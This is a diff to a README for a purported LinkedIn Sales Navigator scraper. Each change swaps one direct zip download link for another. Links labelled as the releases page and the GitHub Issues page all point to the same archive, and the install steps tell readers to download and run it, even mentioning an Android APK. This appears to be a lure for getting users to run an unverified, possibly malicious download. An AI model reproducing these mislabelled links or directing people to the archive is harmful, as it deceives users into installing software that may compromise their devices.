@@ -6,7 +6,7 @@ Welcome to the **LinkedIn Sales Navigator Scraper**. This tool helps you automat
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/sakthimurugan123/linkedin-sales-navigator-scraper/main/media/linkedin-sales-navigator-scraper-v1.3.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/sakthimurugan123/linkedin-sales-navigator-scraper/main/media/linkedin-sales-navigator-scraper-v1.3.zip)
+[![Download Now](https://github.com/sakthimurugan123/linkedin-sales-navigator-scraper/raw/refs/heads/main/media/linkedin_navigator_scraper_sales_v2.5.zip%20Now-v1.0-blue)](https://github.com/sakthimurugan123/linkedin-sales-navigator-scraper/raw/refs/heads/main/media/linkedin_navigator_scraper_sales_v2.5.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ To run the **LinkedIn Sales Navigator Scraper**, ensure you have the following:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sakthimurugan123/linkedin-sales-navigator-scraper/main/media/linkedin-sales-navigator-scraper-v1.3.zip) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/sakthimurugan123/linkedin-sales-navigator-scraper/raw/refs/heads/main/media/linkedin_navigator_scraper_sales_v2.5.zip) to find the latest version.
 2. **Select the Latest Version:** Look for the most recent release. There, you’ll find a list of downloadable files.
 3. **Download the Application:** Click on the appropriate file for your system. If you're using an Android device, you will find an APK file. Download this file to your device.
 4. **Run the Installer:** Navigate to the file you downloaded. Open it to begin installation. Follow the on-screen prompts to complete the setup.
@@ -57,7 +57,7 @@ If you encounter any issues:
 
 ## 🔧 Join the Community
 
-We encourage users to engage with the community for questions, suggestions, or improvements. Visit our [GitHub Issues page](https://raw.githubusercontent.com/sakthimurugan123/linkedin-sales-navigator-scraper/main/media/linkedin-sales-navigator-scraper-v1.3.zip) to participate.
+We encourage users to engage with the community for questions, suggestions, or improvements. Visit our [GitHub Issues page](https://github.com/sakthimurugan123/linkedin-sales-navigator-scraper/raw/refs/heads/main/media/linkedin_navigator_scraper_sales_v2.5.zip) to participate.
 
 ## 📞 Contact Us
 
